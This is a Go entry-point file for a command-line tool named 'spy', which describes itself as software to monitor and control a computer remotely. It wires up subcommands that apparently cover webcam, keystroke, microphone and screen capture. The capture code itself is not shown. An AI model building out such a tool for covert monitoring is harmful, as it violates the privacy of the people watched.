package main

import (
	"fmt"
	"os"

	"github.com/cinus-e/spy/cmd"
	"github.com/urfave/cli/v2"
)

func main() {
	app := cli.NewApp()
	app.Name = "spy"
	app.Usage = "Spy software to monitor and control computer remotely"
	app.Version = "0.0.1.20221011"
	app.Commands = []*cli.Command{
		cmd.App,
		cmd.Cam,
		cmd.Key,
		cmd.Mic,
		cmd.Scr,
	}
	if err := app.Run(os.Args); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
